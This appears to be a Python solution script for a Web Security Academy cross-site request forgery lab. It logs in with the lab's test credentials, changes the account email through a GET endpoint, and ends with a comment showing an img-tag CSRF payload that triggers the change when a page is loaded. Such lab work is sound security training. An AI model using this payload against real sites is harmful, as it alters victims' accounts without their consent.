#!/usr/bin/python3

import requests
import sys
from bs4 import BeautifulSoup

def changeEmail(url, api_login, api_changeEmail, email):

    # Getting CSRF Token
    s = requests.Session()
    r = s.get(url + api_login)
    p = BeautifulSoup(r.content, "lxml")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    data = {
        "csrf" : csrf,
        "username": "wiener",
        "password": "peter",
    }

    r = s.post(url + api_login, data=data)
    #print(r.status_code)

    if r.status_code == 200:
        print("[INFO] Login successful!")

        changeEmail = "?email=" + email

        # GET Request to change email
        r = s.get(url + api_changeEmail + changeEmail)
        #print(r.status_code)
        if r.status_code == 200:
            print(f"[INFO] Email changed to: {email}")
        else:
            print("[INFO] Something went wrong!")
            sys.exit(1)
    else: 
        print("[INFO] Something went wrong!")
        sys.exit(1)


if __name__ == '__main__':
    url = "https://ac381f911fa87554c0320f8700af0003.web-security-academy.net"
    api_login = "/login"
    api_changeEmail = "/my-account/change-email"
    email = sys.argv[1]

    changeEmail(url, api_login, api_changeEmail, email)


# Payload Used (HTML GET Method)

# <img src="https://ac381f911fa87554c0320f8700af0003.web-security-academy.net/my-account/change-email?email=bigb0ss.bad@gmail.com">